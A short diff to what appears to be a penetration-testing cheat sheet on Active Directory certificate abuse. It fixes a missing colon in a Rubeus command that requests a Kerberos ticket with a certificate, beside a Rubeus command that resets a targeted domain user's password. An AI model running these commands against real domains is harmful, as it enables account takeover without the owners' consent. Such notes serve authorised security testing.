@@ -88,7 +88,7 @@ Windows Start Menu > mmc > File > Add/Remove Snap-in > Certificates > Add > Now 
   - Load the Kerberos TGT
 
   ### Rubeus
-  > Rubeus.exe asktgt /user***username*** /enctype:aes256 /certificate:***path to cert*** /password:***cert file pass*** /outfile:***name of file to write*** /domain:***domain name*** /dc:***IP***
+  > Rubeus.exe asktgt /user:***username*** /enctype:aes256 /certificate:***path to cert*** /password:***cert file pass*** /outfile:***name of file to write*** /domain:***domain name*** /dc:***IP***
   
   > Rubeus.exe changepw /ticket:***path to ticket*** /new:***new pass for user*** /dc:***domain*** /targetuser:***domain***\***username targeted***
   
